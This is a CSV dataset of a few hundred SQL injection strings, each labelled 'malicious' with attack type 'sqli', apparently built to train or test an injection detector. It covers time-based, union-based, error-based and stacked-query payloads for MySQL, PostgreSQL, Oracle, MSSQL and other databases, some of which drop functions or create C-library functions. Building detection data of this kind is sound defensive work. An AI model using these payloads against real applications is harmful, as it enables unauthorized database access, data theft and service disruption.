payload,label,attack_type
1;select pg_sleep(5)-- ojzt,malicious,sqli
"1"" where 4633=4633 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",malicious,sqli
"1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748",malicious,sqli
"-2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#",malicious,sqli
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ozef'='ozef",malicious,sqli
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl",malicious,sqli
"(select like('abcdefg',upper(hex(randomblob(500000000/2)))))",malicious,sqli
"-3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",malicious,sqli
1') as xqbq where 1619=1619 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,malicious,sqli
1' where 8635=8635 order by 1--,malicious,sqli
"1 union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
1);select sleep(5) and (4863=4863,malicious,sqli
"1"" and (select * from (select(sleep(5)))gcrr)#",malicious,sqli
"-1048%"" or 3038=3038",malicious,sqli
1) as wshv where 5684=5684;(select * from (select(sleep(5)))acdk)#,malicious,sqli
-4289' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'agnc' like 'agnc,malicious,sqli
"-3219"") order by 1--",malicious,sqli
"1%');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1') where 4092=4092 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"")) as riui where 2605=2605;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1%' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and '%'='",malicious,sqli
"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""kzcd""=""kzcd",malicious,sqli
"-9774'))) union all select 6954,6954,6954#",malicious,sqli
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso",malicious,sqli
1')) as bswc where 1635=1635 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,malicious,sqli
"1) and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1';select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
-2817) where 1212=1212 or 3266=1102,malicious,sqli
"1')) as ylyq where 2953=2953 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
-8453))) or 3038=3038,malicious,sqli
1') where 6222=6222 or (select * from (select(sleep(5)))ydpu)--,malicious,sqli
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('lyem' like 'lyem",malicious,sqli
"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""stcv""=""stcv",malicious,sqli
"1"") where 5491=5491;begin user_lock.sleep(5); end--",malicious,sqli
"1%"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1"")) as vbpl where 3885=3885 and 6969=(select 6969 from pg_sleep(5))--",malicious,sqli
"1""));if(9690=6491) select 9690 else drop function nyln--",malicious,sqli
"1,iif(6333=1227,1,1/0)",malicious,sqli
"1"") where 4951=4951;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
"1%"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",malicious,sqli
"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",malicious,sqli
"-3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",malicious,sqli
1' where 6913=6913 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,malicious,sqli
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",malicious,sqli
"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""kins""=""kins",malicious,sqli
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",malicious,sqli
1)) order by 1#,malicious,sqli
"-9122) as sdlg where 1546=1546 union all select 1546,1546,1546,1546,1546,1546,1546--",malicious,sqli
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""vjvz"" like ""vjvz",malicious,sqli
"1"") or sleep(5) and (""fiag"" like ""fiag",malicious,sqli
"-2009%' union all select 1991,1991#",malicious,sqli
"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",malicious,sqli
1' and 5835=6157 and 'bjee' like 'bjee,malicious,sqli
"1%""));select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
"1)) as nxdf where 1696=1696 or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
"1%' union all select null,null,null,null,null,null,null--",malicious,sqli
"1') where 7093=7093 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1"" and make_set(8262=3471,3471) and ""wayp""=""wayp",malicious,sqli
"-2610%"") union all select 7779,7779,7779,7779,7779--",malicious,sqli
"1%')) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
-7565') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('gymz'='gymz,malicious,sqli
"1%"") and 8024=3560--",malicious,sqli
-2869')) union all select 3216--,malicious,sqli
"1',(select (case when (1570=1570) then (select 1570 from pg_sleep(5)) else 1/(select 0) end))",malicious,sqli
"1' in boolean mode) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",malicious,sqli
"1'))) union all select null,null,null,null,null,null--",malicious,sqli
"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
1) and 7533=7533,malicious,sqli
1%' and 2006=2006,malicious,sqli
1 rlike (select (case when (7689=7689) then 1 else 0x28 end)),malicious,sqli
"-6305""))) or 8097=2048 and (((""euyy"" like ""euyy",malicious,sqli
"1"") where 9545=9545 and 9198=9198--",malicious,sqli
"1',extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",malicious,sqli
"1))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((5199=5199",malicious,sqli
1' in boolean mode);waitfor delay '0:0:5'#,malicious,sqli
"-5417 or elt(1032=1032,3623)",malicious,sqli
"1)) as xvyi where 6701=6701 union all select null,null,null,null#",malicious,sqli
"1'+(select 'jfir' where 7814=7814 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))+'",malicious,sqli
1'||(select 'lxyu' from dual where 5789=5789 union all select null#,malicious,sqli
"1') where 3375=3375 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1' where 3028=3028;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1' where 7036=7036;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"-1510'))) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",malicious,sqli
1'+(select 'ymgm' where 8204=8204 and sleep(5)#,malicious,sqli
"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('%'='",malicious,sqli
"1"") where 8702=8702 union all select null,null,null,null,null--",malicious,sqli
"1""));begin user_lock.sleep(5); end and ((""kvts"" like ""kvts",malicious,sqli
"1'||(select 'kgfu' from dual where 2607=2607 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"-9871"") union all select 9082#",malicious,sqli
1);waitfor delay '0:0:5'--,malicious,sqli
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('jryo'='jryo,malicious,sqli
1') and 9198=9198--,malicious,sqli
"-3952') union all select 6644,6644,6644--",malicious,sqli
"1%"" rlike (select * from (select(sleep(5)))vwyq)#",malicious,sqli
1));if(7899=7899) select 7899 else drop function zbbp--,malicious,sqli
"1%'))) union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
"-3393"")) union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",malicious,sqli
"1"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%';iif(5257=5257,1,1/0)",malicious,sqli
"1'+(select 'mxei' where 7811=7811 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",malicious,sqli
-3450' where 4478=4478 or 9323=9323#,malicious,sqli
-8057')) as gpue where 4205=4205 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
"-5672%"" or 3825=9675--",malicious,sqli
1' or 4240=(select 4240 from pg_sleep(5))--,malicious,sqli
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",malicious,sqli
1%'));select (case when (4006=1276) then 1 else 4006*(select 4006 from master..sysdatabases) end)--,malicious,sqli
"1"") and (3020=3020)*6703 and (""hkjf""=""hkjf",malicious,sqli
"1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",malicious,sqli
(select (case when (3950=2747) then 1 else 1/(select 0) end)),malicious,sqli
1) where 6039=6039 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
"1') as ssez where 5351=5351 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)# aetd",malicious,sqli
"-3979' in boolean mode) union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",malicious,sqli
"1"") where 9648=9648 and elt(1210=1210,sleep(5))--",malicious,sqli
"-7323%"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""%""=""",malicious,sqli
"1'||(select 'sned' where 4957=4957 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1%"") or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
1%' rlike (select * from (select(sleep(5)))sgvo) and '%'=',malicious,sqli
"1"") as tnux where 4888=4888 rlike (select * from (select(sleep(5)))vwyq)#",malicious,sqli
"1') as ezoa where 4915=4915 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%""))) or 4240=(select 4240 from pg_sleep(5))--",malicious,sqli
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-1040 where 3058=3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",malicious,sqli
"1' union all select null,null,null,null#",malicious,sqli
"-2448%"") or 3038=3038",malicious,sqli
"-5225')) as zats where 5629=5629 union all select 5629,5629,5629,5629,5629--",malicious,sqli
"1'||(select 'jzwq' where 3289=3289 union all select null,null,null,null,null,null,null#",malicious,sqli
"1%"")) union all select null,null#",malicious,sqli
-7230') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('khtc'='khtc,malicious,sqli
"1') as znak where 5203=5203;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
"-4970') union all select 4625,4625,4625,4625,4625,4625,4625,4625#",malicious,sqli
1) where 4780=4780;begin dbms_lock.sleep(5); end--,malicious,sqli
"1')) as qzyp where 5081=5081 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",malicious,sqli
"1') where 9091=9091 union all select null,null,null,null#",malicious,sqli
"1) where 6340=6340 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",malicious,sqli
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('mfmk'='mfmk,malicious,sqli
"1'qhfy<'"">utwq",malicious,sqli
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1'+(select immd where 7499=7499 union all select null,null,null,null,null,null,null,null#",malicious,sqli
"-9031%"") order by 1--",malicious,sqli
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'ozur'='ozur",malicious,sqli
"1 where 7642=7642 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",malicious,sqli
"-3007) where 6648=6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",malicious,sqli
1%'))) and 8594=(select 8594 from pg_sleep(5))--,malicious,sqli
"1"" where 2452=2452;select sleep(5)#",malicious,sqli
-9327') or 3038=3038,malicious,sqli
"-3035"") union all select 7912,7912,7912#",malicious,sqli
1%')) or 6793=(select 6793 from pg_sleep(5)) and (('%'=',malicious,sqli
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""kndm""=""kndm",malicious,sqli
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,malicious,sqli
"-7088'||(select 'arol' from dual where 8891=8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",malicious,sqli
1'+(select 'xqjx' where 7048=7048 and 9198=9198--,malicious,sqli
"1"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"1'+(select 'ggkm' where 3394=3394;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
1) as fhvb where 4008=4008;begin user_lock.sleep(5); end--,malicious,sqli
"1')) as anaq where 9605=9605 and elt(4249=4249,7259)--",malicious,sqli
"1') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,sqli
1)) and 9198=9198--,malicious,sqli
"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",malicious,sqli
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",malicious,sqli
"1"") where 7957=7957 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"-6659') where 1256=1256 union all select 1256,1256--",malicious,sqli
-2050' union all select 5606#,malicious,sqli
1' in boolean mode) or 6793=(select 6793 from pg_sleep(5))#,malicious,sqli
"-8256""))) or 6872=6872 and (((""lrtu""=""lrtu",malicious,sqli
"1"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,sqli
"1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""cdnc"" like ""cdnc",malicious,sqli
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""khuw"" like ""khuw",malicious,sqli
"1%') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",malicious,sqli
1' or 6793=(select 6793 from pg_sleep(5)) and 'hokd'='hokd,malicious,sqli
"1%"");begin dbms_lock.sleep(5); end--",malicious,sqli
"1'||(select 'ycya' from dual where 3536=3536 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
1))) rlike (select * from (select(sleep(5)))sgvo) and (((4574=4574,malicious,sqli
1')) as vdhw where 8858=8858 order by 1#,malicious,sqli
"-3710)) union all select 5770,5770,5770,5770,5770,5770,5770#",malicious,sqli
"(select (case when (1938=1938) then dbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5) else 1938 end) from dual)",malicious,sqli
1')) or (select * from (select(sleep(5)))ydpu) and (('ytxg'='ytxg,malicious,sqli
1';select (case when (8642=6049) then 1 else 8642*(select 8642 from master..sysdatabases) end)--,malicious,sqli
"-4012"") or make_set(9354=9354,7185) and (""ccfn""=""ccfn",malicious,sqli
1' where 9242=9242;begin dbms_lock.sleep(5); end--,malicious,sqli
"-4947' in boolean mode) union all select 3314,3314#",malicious,sqli
-1492 where 2788=2788 union all select 2788#,malicious,sqli
"1) as khkv where 2944=2944 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
1'+(select mfcd where 6757=6757 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+',malicious,sqli
"-6363"") where 4043=4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",malicious,sqli
"-9451""))) union all select 4211,4211,4211,4211,4211,4211,4211--",malicious,sqli
-7279) or 9898=9963 and (1481=1481,malicious,sqli
"1' where 2025=2025 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1%')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('%'='",malicious,sqli
1%'))) or (select * from (select(sleep(5)))ydpu) and ((('%'=',malicious,sqli
"1%"")) or elt(5873=5873,sleep(5))#",malicious,sqli
"-1212%') or make_set(7588=2306,2306) and ('%'='",malicious,sqli
"1"" where 2394=2394 and 8831=8333--",malicious,sqli
1'||(select 'bifa' where 6077=6077 and 4547=9301,malicious,sqli
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""zlal""=""zlal",malicious,sqli
1)) as izvy where 2569=2569;begin user_lock.sleep(5); end--,malicious,sqli
"1') as vpop where 2528=2528 union all select null,null,null,null,null,null,null#",malicious,sqli
-7624') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('iwab'='iwab,malicious,sqli
1)));select (case when (2830=7046) then 2830 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1%""))) union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
-7199' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'qibr'='qibr,malicious,sqli
1')) as kdse where 6767=6767 rlike sleep(5)#,malicious,sqli
"-3462)) as biyl where 5143=5143 union all select 5143,5143,5143--",malicious,sqli
"1')) as xjen where 6791=6791 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",malicious,sqli
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'rfgj' like 'rfgj",malicious,sqli
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
1'+(select 'sbji' where 7989=7989 rlike (select * from (select(sleep(5)))sgvo))+',malicious,sqli
"1%"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",malicious,sqli
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
1%'));select (case when (3444=8424) then 3444 else 3444*(select 3444 from information_schema.character_sets) end)#,malicious,sqli
1%'))) order by 1#,malicious,sqli
"1)) as xzcl where 2332=2332;select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
"1"") where 8462=8462 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",malicious,sqli
"-6405' union all select 8235,8235,8235,8235,8235#",malicious,sqli
1) as obzn where 7652=7652 or (select * from (select(sleep(5)))ydpu)--,malicious,sqli
"1"";(select * from (select(sleep(5)))srmq)",malicious,sqli
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'lgat' like 'lgat",malicious,sqli
"1) where 4768=4768 union all select null,null,null,null,null,null,null,null#",malicious,sqli
"1)) as fynx where 9636=9636 union all select null,null,null,null,null--",malicious,sqli
"1') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),malicious,sqli
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",malicious,sqli
"1%' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
"1"") as gffq where 4387=4387 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",malicious,sqli
1'||(select 'sxya' where 3578=3578;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,malicious,sqli
-3185')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('rknd' like 'rknd,malicious,sqli
"-1908"") where 6420=6420 union all select 6420,6420,6420,6420--",malicious,sqli
"1"") as saqy where 9704=9704 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",malicious,sqli
-2055) or 3038=3038,malicious,sqli
"-5379') union all select 4294,4294,4294--",malicious,sqli
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",malicious,sqli
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'kwhs' like 'kwhs",malicious,sqli
"-6368' union all select 6529,6529,6529--",malicious,sqli
1' where 2134=2134 rlike (select (case when (3613=2090) then 1 else 0x28 end))--,malicious,sqli
1)) as skex where 7941=7941 and sleep(5)--,malicious,sqli
"1') as sjzi where 8242=8242 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",malicious,sqli
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('yaim'='yaim,malicious,sqli
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",malicious,sqli
"-9439"") where 9460=9460 or (9497=9586)*9586--",malicious,sqli
"1) where 5550=5550 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",malicious,sqli
"1%""))) union all select null,null,null,null,null,null,null,null--",malicious,sqli
1 where 2672=2672 and 1819=4322#,malicious,sqli
"1'||(select 'dajl' from dual where 8440=8440;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
1'+(select 'sfko' where 6853=6853 rlike sleep(5)#,malicious,sqli
"1"") as ubva where 6369=6369 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1') or elt(5873=5873,sleep(5))#",malicious,sqli
"1%' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and '%'='",malicious,sqli
"1%"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""%""=""",malicious,sqli
1' or sleep(5)#,malicious,sqli
1));select (case when (6002=9048) then 6002 else 6002*(select 6002 from mysql.db) end)#,malicious,sqli
1' and (select * from (select(sleep(5)))fzno) and 'vwve' like 'vwve,malicious,sqli
"-2033"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"-9382') union all select 4774,4774,4774,4774--",malicious,sqli
"1"") as xrsi where 9498=9498;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
1'||(select 'rhcv' where 6228=6228;select (case when (3672=8360) then 3672 else 3672*(select 3672 from information_schema.character_sets) end)#,malicious,sqli
